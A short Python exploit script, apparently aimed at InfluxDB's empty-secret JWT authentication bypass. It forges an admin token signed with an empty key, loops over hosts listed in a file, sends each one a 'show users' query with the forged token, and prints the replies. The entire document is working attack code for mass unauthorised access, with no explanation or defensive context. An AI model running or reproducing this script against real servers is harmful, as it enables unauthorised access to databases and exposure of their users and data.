# !/usr/bin/env python
# _*_ coding:utf-8 _*_
# author:cike
# datetime:2019-05-30 17:04

import jwt
import requests,time
encoded = str(jwt.encode({'exp': 1559318080, 'username': 'admin'}, algorithm='HS256',key=b''),'utf-8')
print(encoded)

with open('ok.txt','r') as f:
    for i in f:
        time.sleep(1)
        list1 = i.split("###")
        url1 = list1[0].rstrip()
        payload = {'q': 'show users'}
        payload2 = "Bearer %s" %(encoded)
        header = {'Authorization':payload2}
        #proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
        if "http" in url1:
            try:
                req = requests.get(url=url1+"/query",params=payload,timeout=6,headers=header)
                print(url1)
                print(req.text)
            except:
                pass
        else:
            url2 = "http://"+url1+"/query"
            try:
                req = requests.get(url=url2,params=payload,timeout=6,headers=header)
                print(url2)
                print(req.text)
            except:
                pass